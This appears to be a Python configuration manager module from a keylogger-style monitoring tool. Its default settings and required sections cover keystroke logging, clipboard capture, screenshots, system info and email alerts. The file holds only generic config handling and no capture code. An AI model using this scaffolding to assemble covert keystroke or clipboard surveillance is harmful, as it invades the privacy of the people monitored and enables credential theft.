"""
Configuration Manager Module
Handles loading and managing application configuration
"""

import json
import os
from pathlib import Path
from copy import deepcopy


class ConfigManager:
    """Manage application configuration"""
    
    def __init__(self, config_file="config/config.json"):
        """
        Initialize configuration manager
        
        Args:
            config_file (str): Path to configuration file
        """
        self.config_file = config_file
        self.config = {}
        self.load_config()
    
    def load_config(self):
        """Load configuration from JSON file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    self.config = json.load(f)
                print(f"[*] Configuration loaded from {self.config_file}")
                return True
            else:
                print(f"[!] Configuration file not found: {self.config_file}")
                self.config = {}
                return False
        except json.JSONDecodeError as e:
            print(f"[!] Error parsing JSON configuration: {e}")
            self.config = {}
            return False
        except Exception as e:
            print(f"[!] Error loading configuration: {e}")
            self.config = {}
            return False
    
    def save_config(self):
        """Save current configuration to file"""
        try:
            Path(self.config_file).parent.mkdir(parents=True, exist_ok=True)
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=2)
            print(f"[*] Configuration saved to {self.config_file}")
            return True
        except Exception as e:
            print(f"[!] Error saving configuration: {e}")
            return False
    
    def get(self, key, default=None):
        """
        Get configuration value
        
        Args:
            key (str): Configuration key (supports dot notation: module.subkey)
            default: Default value if key not found
            
        Returns:
            Configuration value or default
        """
        keys = key.split('.')
        value = self.config
        
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k)
            else:
                return default
        
        return value if value is not None else default
    
    def set(self, key, value):
        """
        Set configuration value
        
        Args:
            key (str): Configuration key (supports dot notation: module.subkey)
            value: Value to set
            
        Returns:
            bool: True if successful
        """
        try:
            keys = key.split('.')
            config = self.config
            
            # Navigate to the proper location
            for k in keys[:-1]:
                if k not in config:
                    config[k] = {}
                config = config[k]
            
            config[keys[-1]] = value
            return True
        except Exception as e:
            print(f"Error setting configuration: {e}")
            return False
    
    def get_section(self, section):
        """
        Get entire configuration section
        
        Args:
            section (str): Section name
            
        Returns:
            dict: Section configuration or empty dict if not found
        """
        return self.config.get(section, {})
    
    def update_section(self, section, updates):
        """
        Update configuration section
        
        Args:
            section (str): Section name
            updates (dict): Dictionary of updates to apply
            
        Returns:
            bool: True if successful
        """
        try:
            if section not in self.config:
                self.config[section] = {}
            
            self.config[section].update(updates)
            return True
        except Exception as e:
            print(f"Error updating section: {e}")
            return False
    
    def is_enabled(self, module):
        """
        Check if a module is enabled
        
        Args:
            module (str): Module name
            
        Returns:
            bool: True if enabled, False otherwise
        """
        return self.get(f"{module}.enabled", False)
    
    def get_all_enabled_modules(self):
        """Get list of all enabled modules"""
        enabled = []
        for section, settings in self.config.items():
            if isinstance(settings, dict) and settings.get("enabled", False):
                enabled.append(section)
        return enabled
    
    def validate_config(self):
        """Validate configuration integrity"""
        required_sections = [
            "keylogger",
            "advanced_logging",
            "system_info",
            "screenshots",
            "clipboard",
            "email_alerts",
            "general"
        ]
        
        missing_sections = []
        for section in required_sections:
            if section not in self.config:
                missing_sections.append(section)
        
        if missing_sections:
            print(f"[!] Missing configuration sections: {', '.join(missing_sections)}")
            return False
        
        print("[*] Configuration validation passed")
        return True
    
    def get_config_summary(self):
        """Get a summary of the configuration"""
        summary = {
            "file": self.config_file,
            "enabled_modules": self.get_all_enabled_modules(),
            "general_settings": self.get_section("general"),
            "log_directory": self.get("general.log_directory"),
            "screenshot_directory": self.get("general.screenshot_directory")
        }
        return summary
    
    def create_default_config(self):
        """Create a default configuration"""
        default_config = {
            "keylogger": {
                "enabled": True,
                "log_file": "logs/keylog.txt",
                "capture_special_keys": True,
                "stop_key": "esc"
            },
            "advanced_logging": {
                "enabled": True,
                "log_format": "json",
                "export_csv": True,
                "session_tracking": True
            },
            "system_info": {
                "enabled": True,
                "capture_interval": 300,
                "include_cpu": True,
                "include_memory": True
            },
            "screenshots": {
                "enabled": False,
                "capture_type": "full",
                "save_directory": "screenshots"
            },
            "clipboard": {
                "enabled": True,
                "log_file": "logs/clipboard.txt"
            },
            "email_alerts": {
                "enabled": False
            },
            "general": {
                "debug_mode": True,
                "log_directory": "logs"
            }
        }
        
        self.config = default_config
        return self.save_config()


if __name__ == "__main__":
    config = ConfigManager()
    config.validate_config()
    print(json.dumps(config.get_config_summary(), indent=2))
